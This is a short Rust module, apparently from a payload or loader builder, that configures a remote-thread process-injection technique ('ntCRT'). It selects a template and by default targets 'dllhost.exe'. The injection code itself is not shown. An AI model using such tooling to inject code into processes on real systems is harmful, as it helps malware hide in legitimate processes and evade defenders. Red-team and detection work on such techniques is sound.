use crate::techniques::{BuildContext, Technique, TechniqueMeta};

pub struct Ntcrt;

impl Technique for Ntcrt {
    fn meta(&self) -> &'static TechniqueMeta { &NTCRT_META }
    fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
        ctx.set_template("ntCRT");
        let tgt = ctx.param("ntcrt", "target_process").unwrap_or("dllhost.exe");
        ctx.set_replacement("{{TARGET_PROCESS}}", tgt.to_string());
        ctx.apply_exec_mode("ntcrt");
        Ok(())
    }
}

pub use super::super::NTCRT_META;
